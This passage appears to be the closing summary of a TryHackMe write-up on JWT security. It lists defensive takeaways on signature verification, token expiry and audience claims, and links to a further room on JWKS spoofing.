-   The JWT is only as secure as its signature. Care should be taken when verifying the signature to ensure that there is no confusion or weak secrets being used.
-   JWTs should expire and have sensible lifetimes to avoid persistent JWTs being used by a threat actor.
-   In SSO environments, the audience claim is crucial to ensure that the specific application's JWT is only used on that application.
-   As JWTs make use of cryptography to generate the signature, cryptographic attacks can also be relevant for JWT exploitation. We will dive into this a bit more in our cryptography module.

-   In this room, we did not cover a JWKS spoofing attack. If you are interested in performing this exploit, take a look at [this room](https://tryhackme.com/r/room/hammer).



<img width="1919" height="367" alt="image" src="https://github.com/user-attachments/assets/531eb1e2-fb27-4e24-84db-5da5d8f8c039" />




  
</details>










































